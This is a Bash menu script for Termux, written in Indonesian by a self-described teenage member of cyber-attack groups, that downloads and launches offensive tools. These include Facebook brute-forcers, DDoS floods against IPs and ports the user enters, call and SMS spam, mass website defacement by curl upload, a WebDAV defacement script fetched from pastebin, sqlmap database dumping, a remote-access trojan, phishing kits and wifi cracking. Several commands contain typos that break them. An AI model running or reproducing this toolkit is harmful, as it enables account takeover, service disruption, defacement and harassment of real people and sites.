##########################################################
# Author     : Billal { Bl4ck_Dr460n			 #
# Name Tools : MyTools					 #
# Version    : 1.0					 #
# Code       : rooted@dr460n				 #
##########################################################
# [!] Gunakan Dengan Bijak Jangan SalahKan Tools Ini [!] #
##########################################################
#                        MyTeam				 #
##########################################################
#                   Black Cyber Army			 #
#              Indonesia Attacker Public   		 #
#                   Subang Cyber Team			 #
##########################################################
cd modul
biru='\033[34;1m' #biru
green='\e[0;32m' #hijau muda
daun='\033[32;1m' #ijo
purple='\033[35;1m' #purple
cyyan='\033[36;1m' #cyan
merah='\033[31;1m' #merah
putih='\033[37;1m' #pur
tai='\033[33;1m' #kuning
###################################################
# CTRL + C
###################################################
trap ctrl_c INT
ctrl_c() {
clear 
echo $tai"["$daun"!"$tai"]>"$merah" CTRL + C Detected !!!"
sleep 0.1
echo $tai"["$daun"!"$tai"]>"$merah" Tunggu 3 Detik"
sleep 3
echo
echo
exit
}

lagi=1
while [ $lagi -lt 4 ];
do
clear
echo $tai "["$daun"!"$tai"]"$merah "© Bl4ck Dr460n"
sleep 2
sh logog.sh

	echo
	echo
			echo $biru "[==========================]"
			echo $biru "["$tai"   GUNAKAN DENGAN BIJAK  "  $biru"]"
			echo $biru "[==========================]"
	echo		
	echo
echo $merah "+++[]============================[]+++"
sleep 0.2
echo $daun  "     1.FBBRUTE BL4CK DR460N"
echo $merah "+++[]============================[]+++"
sleep 0.2
echo $daun  "     2.Metasploit"
echo $merah "+++[]============================[]+++"
sleep 0.2
echo $daun  "     3.Tools DDOS"
echo $merah "+++[]============================[]+++"
sleep 0.2
echo $daun  "     4.SpamCall"
echo $merah "+++[]============================[]+++"
sleep 0.2
echo $daun  "     5.KKKTP Generate"
echo $merah "+++[]============================[]+++"
sleep 0.2
echo $daun  "     6.Mempercepat Sinyal"
echo $merah "+++[]============================[]+++"
sleep 0.2
echo $daun  "     7.RED_HAWK"
echo $merah "+++[]============================[]+++"
sleep 0.2
echo $daun  "     8.Hack Facebook Iqbalz"
echo $merah "+++[]============================[]+++"
sleep 0.2
echo $daun  "     9.Yahoo Cloning"
echo $merah "+++[]============================[]+++"
sleep 0.2
echo $daun  "     10.Report Facebook"
echo $merah "+++[]============================[]+++"
sleep 0.2
echo $daun  "     11.Xerxes"
echo $merah "+++[]============================[]+++"
sleep 0.2
echo $daun  "     12.MultiSpam"
echo $merah "+++[]============================[]+++"
sleep 0.2
echo $daun  "     13.Mempercantik Termux"
echo $merah "+++[]============================[]+++"
sleep 0.2
echo $daun  "     14.Multi Deface"
echo $merah "+++[]============================[]+++"
sleep 0.2
echo $daun  "     15.Mempercantik Termux 2"
echo $merah "+++[]============================[]+++"
sleep 0.2
echo $daun  "     16.Deface Method "$tai"Webdav"
echo $merah "+++[]============================[]+++"
sleep 0.2
echo $daun  "     17.OSIF"
echo $merah "+++[]============================[]+++"
sleep 0.2
echo $daun  "     18.D-Tect"
echo $merah "+++[]============================[]+++"
sleep 0.2
echo $daun  "     19.Hammer"
echo $merah "+++[]============================[]+++"
sleep 0.2
echo $daun  "     20.IPGeoLocation"
echo $merah "+++[]============================[]+++"
sleep 0.2
echo $daun  "     21.Weeman"
echo $merah "+++[]============================[]+++"
sleep 0.2
echo $daun  "     22.Wifi Hacker"
echo $merah "+++[]============================[]+++"
sleep 0.2
echo $daun  "     23.Lazymux"
echo $merah "+++[]============================[]+++"
sleep 0.2
echo $daun  "     24.SqlMap"
echo $merah "+++[]============================[]+++"
sleep 0.2
echo $daun  "     25.A-Rat"
echo $merah "+++[]============================[]+++"
sleep 0.2
echo $daun  "     26.WEBPWN3R"
echo $merah "+++[]============================[]+++"
sleep 0.2
echo $daun  "     27.ProfilGuard Facebook"
echo $merah "+++[]============================[]+++"
sleep 0.2
echo $daun  "     28.Termux-A"
echo $merah "+++[]============================[]+++"
sleep 0.2
echo $daun  "     29.Metasploit Framework"
echo $merah "+++[]============================[]+++"
sleep 0.2
echo $daun  "     30.SocialFish"
echo $merah "+++[]============================[]+++"
sleep 0.2
echo $daun  "     31.Wordlist Generator ( Cupp )"
echo $merah "+++[]============================[]+++"
sleep 0.2
echo $daun  "     32.LITESPAM"
echo $merah "+++[]============================[]+++"
sleep 0.2
echo $daun  "     33.Wifite"
echo $merah "+++[]============================[]+++"
sleep 0.2
echo $daun  "     34.GcoSpam"
echo $merah "+++[]============================[]+++"
sleep 0.2
echo $daun  "     35.All_Seeing"
echo $merah "+++[]============================[]+++"
echo
sleep 0.5
echo $merah "+++[]============================[]+++"
echo $daun  "      0.Install Bahan"
echo $merah "+++[]============================[]+++"
sleep 0.2
echo $daun  "      I.Info"
echo $merah "+++[]============================[]+++"
sleep 0.2
echo $daun  "      E.Exit"
echo $merah "+++[]============================[]+++"
sleep 0.1
echo $daun
read -p "[Masukan Pilihan Anda]>> " pilih

if [ $pilih = "" ]
then
echo $merah " Tidak Boleh Kosong"$daun
echo
read -p "[Masukan Pilihan Anda]>> " pilih
fi

if [ $pilih = "1" ] || [ $pilih = "1" ]
then
clear
pkg install python -y
pkg install python2 -y
pip2 install mechanize
git clone https://github.com/Bl4ckDr460n/facebookbrute
mv facebookbrute $HOME
cd $HOME/facebookbrute
python2 brute.py
exit
fi

if [ $pilih = "2" ] || [ $pilih = "2" ]
then
clear
git clone https://github.com/4L13199/meTAInstall
mv meTAInstall $HOME
cd $HOME/meTAInstall
chmod 777 *
sh meTAInstall.sh
fi

if [ $pilih = "3" ] || [ $pilih = "3" ]
then
clear
pkg install python -y
pkg install python2 -y
git clone https://github.com/Bl4ckDr460n/DDOS
mv DDOS $HOME
cd $HOME/DDOS
clear
echo $tai "Masukan IP Target"$daun
read -p "dr460n >>" target
echo
echo $tai "Masukan Port Target"$daun
read -p "dr460n >>" p
echo
echo $tai "Masukan Kecepatan Paket"$daun
read -p "dr460n >>" t
python3 DDOS.py -s $target -p $p -t $t
fi

if [ $pilih = "4" ] || [ $pilih = "4" ]
then
clear
pkg install php -y
pkg install cowsay -y
git clone https://github.com/Bl4ckDr460n/spamcall
mv spamcall $HOME
cd $HOME/spamcall
php Call.php
exit
fi

if [ $pilih = "5" ] || [ $pilih = "5" ]
then
clear
pkg install php -y
git clone https://github.com/Bl4ckD460n/freekkktp
mv freekkktp $HOME
cd $HOME/freekkktp
php ktp.php
exit
fi

if [ $pilih = "6" ] || [ $pilih = "6" ]
then
clear
echo $tai
cowsay -f kiss.cow "BL4CKDR460N"
echo 	
echo			
echo	$cyyan "      Code By "$merah"Bl4ck_Dr460n"
echo
echo
echo
echo $daun
ping google.com
fi

if [ $pilih = "7" ] || [ $pilih = "7" ]
then
clear
pkg install php -y
git clone https://github.com/Tuhinshubhra/RED_HAWK
mv RED_HAWK $HOME
cd $HOME/RED_HAWK
php rhawk.php
exit
fi

if [ $pilih = "8" ] || [ $pilih = "8" ]
then
clear
pkg install python2 -y
git clone https://github.com/IqbalzNoobs/fb-brute
mv fb-brute $HOME
cd $HOME/fb-brute
pip2 install mechanize
python2 brute.py
fi

if [ $pilih = "9" ] || [ $pilih = "9" ]
then
clear
pkg install python2 -y
git clone https://github.com/FR13ND8/EmailVuln
mv EmailVuln $HOME
cd $HOMR/EmailVuln
python2 vuln.py
fi

if [ $pilih = "10" ] || [ $pilih = "10" ]
then
clear
pkg install python2 -y
git clone https://github.com/IlayTamvan/Report
mv Report $HOME
cd $HOME/Report
unzip Report.zip
python2 Report.py
fi

if [ $piluh = "11" ]
then
clear
pkg install clang -y
pkg install git -y
git clone https://github.com/zanyarjamal/xerxes
mv xerxes $HOME
cd $HOME/xerxes
chmod +x *
clang xerxes.c -o xerxes
echo $daun
read -p "[Masukan Web Target]>> " webtarget
./xeexes $webtarget 80
fi

if [ $pilih = "12" ] || [ $pilih = "12" ]
then
clear
git clone https://github.com/Bl4ckDr460n/MultiSpam
mv MultiSpam $HOME
cd $HOME/MultiSpam
sh MultiSpam.sh
exit
fi

if [ $pilih = "13" ] || [ $pilih = "13" ]
then
clear
cd modul
cp bash.bashrc $HOME/../usr/etc
bash $HOME/../usr/etc/bash.bashrc
fi

if [ $pilih = "14" ]
then
clear
cowsay -f dragon.cow "DR460N" | lolcat
echo
echo
echo $merah "["$tai"!"$merah"]"$biru"Simpan Di Luar Folder sdcard"$merah"["$tai"!"$merah"]"
echo
echo
echo $tai "Masukan Nama Script"
read -p "[root@dr460n]>> " sc
echo
echo $tai "Masukan Web ke 1" $daun
read -p "[root@dr460n]>> " k1
echo
echo $tai "Masukan Web Ke 2" $daun
read -p "[root@dr460n]>> " k2
echo
echo $tai "Masukan Web Ke 3" $daun
read -p "[root@dr460n]>> " k3
echo
echo $tai "Masukan Web Ke 4"$daun
read -p "[root@dr460n]>> " k4
echo
echo $tai "Masukan Web Ke 5"$daun
read -p "[toot@dr460n]>> " k5
echo
echo
curl -T /storage/emulated/0/$sc $k1
echo $daun "DONE !"
curl -T /storage/emulated/0/$sc $k2
echo $daun "DONE !"
curl -T /storage/emulated/0/$sc $k3
echo $daun "DONE !"
curl -T /storage/emulated/0/$sc $k4
echo $daun "DONE !"
curl -T /storage/emulated/0/$sc $k5
echo $daun "DONE !"
echo
echo $tai "[]===============================[]"
echo $tai "[] Silahkan Cek $k1""              []"
echo $tai "[]                               []"
echo $tai "[] Silahkan Cek $k2""              []"
echo $tai "[]                               []"
echo $tai "[] Silahkan Cek $k3""              []"
echo $tai "[]                               []"
echo $tai "[] Silahkan Cek $k4""              []"
echo $tai "[]                               []"
echo $tai "[] Silahkan Cek $k1""              []"
echo $tai "[]===============================[]"
exit
fi

if [ $pilih = "15" ]
then
clear
cd dll
cd home-termux
pkg install python2
python2 run.py
exit
fi

if [ $pilih = "16" ]
then
clear
pkg install wget -y
mkdir $HOME/Webdav
cd $HOME/Webdav
wget https://pastebin.com/raw/HnVyQPtR -O webdav.py
chmod 777 webdav.py
clear
echo $merah"["$daun"!"$merah"]"$tai"Simpan Script Di Luar Folder Sdcard"$merah"["$daun"!"$merah"]"
echo
echo $tai "Masukan Web/Situs Target"$daun
read -p "[root@dr460n]>> " target
echo
echo $tai "Masukan Nama Script [ index.html ]"$daun
read -p "[root@dr460n]>> " sc
python webdav.py $target $sc
exit
fi

if [ $pilih = "17" ]
then
clear
apt update
apt upgrade
apt install git -y
apt install python2 -y
git clone https://github.com/CiKu370/OSIF
mv OSIF $HOME
cd $HOME/OSIF
python2 osif.py
exit
fi

if [ $pilih = "18" ]
then
clear
pkg update -y
pkg upgrade -y
pkg install python2 -y
pkf install git -y
git clone https://github.com/shawarkhanethicalhacker/D-TECT
mv D-TECT $HOME
cd $HOME/D-TECT
chmod +x *
python2 d-tect.py
exit
fi

if [ $pilih = "19" ]
then
clear
pkg install python -y
pkg install python2 -y
git clone https://github.com/cyweb/hammer
mv hammer $HOME
cd $HOME/hammer
echo $daun
read -p "[Masukan Ip Address Target]>> " iphammer
echo $tai "Ip ="$cyyan" $iphammer"$daun
read -p "[Masukan Port]>> " porthammer
echo $tai "Port ="$cyyan" $porthammer" $daun
python3 hammer.py -s $iphammer -p $porthammer -t 135
exit
fi

if [ $pilih = "20" ]
then
clear
pkg install python2 -y
pkg install python -y
pkg install git -y
git clone https://github.com/maldevel/IPGeoLocation.git
mv IPGeoLocation $HOME
cd $HOME/IPGeoLocation
python2 ipgeolocation.py -m
exit
fi

if [ $pilih = "21" ]
then
clear
pkg install python2 -y
okg install curl -y
pkg install wget -y
pkg install openssh -y
pkg install openssl -y
git clone https://github.com/evait-security/weeman.git
mv weeman $HOME
cd $HOME/weeman
python2 weeman.py
ex
it
fi

if [ $pilih = "22" ]
then
clear
pkg install bash -y
pkg install curl -y
pkg install git -y
git clone https://github.com/esc0rtd3w/wifi-hacker
mv wifi-hacker $HOME
cd $HOME/wifi-hacker
chmod +x *
./wifi-hacker.sh
exit
fi

if [ $pilih = "23" ]
then
clear
pkg install python2 -y
git clone https://github.com/Gameye98/Lazymux.git
mv Lazymux $HOME
cd $HOME/Lazymux
python2 lazymux.py
exit
fi

if [ $pilih = "24" ]
then
clear
pkg install curl -y
pkg install git -y
pkg install python2 -y
git clone https://github.com/sqlmapproject/sqlmap
mv sqlmap $HOME
cd $HOME/sqlmap
clear
echo $daun
read -p "[Masukan Link]>> " linksqlmap
python2 sqlmap.py -u $linksqlmap --dbs
echo $daun
read -p "[Masukan Table]>> " tablesqlmap
python2 sqlmap.py -u $linksqlmap -D $tablesqlmap
read -p "[Masukan Database]>> " datasqlmap
python2 sqlmap.py -u $linksqlmap -D $tablesqlmap -T $datasqlmap
echo $tai "Silahkan LanjutKan "
exit
fi

if [ $piluh = "25" ]
then
clear
pkg install curl -y
pkg install git -y
git clone https://github.com/Xi4u7/A-Rat.git
mv A-Rat $HOME
cd $HOME/A-Rat
python2 A-Rat.py
exit
fi

if [ $pilih = "26" ]
then
echo "Maaf Tools Masih Tahap Pengembangan"
sleep 4
echo $merah "Keluar Dari Program"
exit
fi
if [ $pilih = "27" ]
then
clear
pkg update -y
pkg upgrade -y
pkg install python2 -y
pkg install python -y
pkg install git -y
git clone https://github.com/jaxBCD/FBshield.git
mv FBshield $HOME
cd $HOME/FBshield
python2 guard.py
exit
fi

if [ $pilih = "28" ]
then
clear
pkg update -y
pkg upgarde -y
pkg install termux-api -y
pkg install php -y
pkg install git -y
git clone https://github.com/Cvar1984/Termux-A.git
mv Termux-A $HOME
cd $HOME/Termux-A
php run.php
exit
fi

if [ $pilih = "29" ]
then
clear
pkg update && pkg upgrade && pkg install curl -y
curl -LO https://raw.githubusercontent.com/Hax4us/Metasploit_termux/master/metasploit.sh
mv metasploit.sh $HOME
cd $HOME
chmod +x metasploit.sh
./metasploit.sh
sleep 5
rm metasploit.sh
mv metasploit-framework $HOME
./msfconsole
exit
fi

if [ $pilih = "30" ]
then
clear
pkg update && pkg uograde && pkg install curl python2 python php wget git -y
git clone https://github.com/Lexiie/SocialFish.git
mv SocialFish $HOME
cd $HOME/SocialFish
python2 SocialFish.py
exit
fi

if [ $pilih = "31" ]
then
clear
pkg update && plg upgrade && pkg install python2 curl wget -y
git clone https://github.com/mebus/cupp.git
mv cupp $HOME
cd $HOME/cupp
python2 cupp.py
exit
fi

if [ $pilih = "32" ]
then
clear
pkg install python2 -y
pkg install php -y
pkg install cowsay -y
pkg install toilet -y
pkg install ruby -y
gem install lolcat
pkg install git -y
git clone https://github.com/4L13199/LITESPAM.git
mv LITESPAM $HOME
cd $HOME/LITESPAM
sh LITESPAM.sh
exit
fi

if [ $pilih = "33" ]
then
clear
echo $tai "["$merah"!"$tai"]"$purple" Pastikan Device Anda Sudah Di Root + Sudah Install Sudo Termux"$daun
read -p "[ Klik Enter Untuk Melanjutkan ]" lanjut
pkg install cowsay -y
pkg install toilet -y
pkg install curl -y
pkg install root-repo -y
pkg install unstable-repo -y
pkg install x11-repo -y
pkg install tsu -y
pkg install aircrack-ng -y
pkg install git -y
git clone https://github.com/derv82/wifite
mv wifite $HOME
cd $HOME/wifite
sudo python2 wifite.py
exit
fi

if [ $pilih = "34" ]
then
clear
pkg install php -y
pkg install git -y
pkg install cowsay -y
pkg install toilet -y
pkg install figlet -y
pkg install python -y
pkg install ruby -y
pip install lolcat
gem install lolcat
git clone https://github.com/Amriez/gcospam
mv gcospam $HOME
cd $HOME/gcospam
sh install.sh
sh gco.sh
exit
fi

if [ $pilih = "35" ]
then
clear
pkg install curl -y
pkg install git -y
git clone https://github.com/zlucifer/all_seeing
mv all_seeing $HOME
cd $HOME/all_seeing
chmod +x *
termux-fix-shebang cctv.sh
./cctv.sh
exit
fi

if [ $pilih ="0" ] || [ $pilih = "0" ]
then
clear
cd modul
sh install.sh
fi
# Exit

if [ $pilih = "E" ]
then
clear
echo $tai "Ya Udah Kalo Gak Mau Ngegunain Tools Ini"
echo $merah "Pelit Amat Sih Jadi Orang :)"
exit
fi

if [ $pilih = "I" ] || [ $pilih = "i" ]
then
clear
echo $merah "[]=============================[]"
echo $merah "[]"$daun"           INFO           "$merah"[]"
echo $merah "[]=============================[]"
echo $merah "[]"$daun"     TENTANG PRIBADI      "$merah"[]"
echo $merah "[]=============================[]"
echo $merah "[]"$daun" Author    : Bl4ck_Dr460n "$merah"[]"
echo $merah "[]"$daun" Nama      : Billal       "$merah"[]"
echo $merah "[]"$daun" Panggilan : Bl4ckD460n   "$merah"[]"
echo $merah "[]"$daun" Umur      : 13 = SD      "$merah"[]"
echo $merah "[]"$daun" No Telp   : 089xxxxxxxxx "$merah"[]"
echo $merah "[]"$daun" Youtube   : Yt Dr460n    "$merah"[]"
echo $merah "[]=============================[]"
echo
echo $merah "[]=============================[]"
echo $merah "[]"$daun"      TENTANG TOOLS          "$merah"[]"
echo $merah "[]=============================[]"
echo $merah "[]"$daun" Name Tools : Tools Hacking  "$merah"[]"
echo $merah "[]"$daun" Version    : 1.0            "$merah"[]"
echo $merah "[]"$daun" code       : dr460n         "$merah"[]"
echo $merah "[]=============================[] "
echo
echo $merah "[]XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX[]"
echo $merah "[]"$daun"               MyGrup              "$merah"[]"
echo $merah "[]XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX[]"
echo $merah "[] "$tai"1.Subang Cyber Army           "$merah"    []"
echo $merah "[] "$tai"2.Woll Cyber Army [ Admin ]   "$merah"    []"
echo $merah "[]XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX[]"
echo
echo
echo $tai"["$daun"B"$tai"/"$daun"Q"$tai"]"
echo $biru "Pilih"
echo $daun
read -p "[root@dr460n]>> " back
fi

if [ $back = "B" ] || [ $back = "b" ]
then
clear
sh Tools.sh
fi

if [ $back = "Q" ] || [ $back = "q" ]
then
clear
echo $tai "Ya Udah Klo Exit"
echo $daun "BY BY........"
exit
fi

done
done
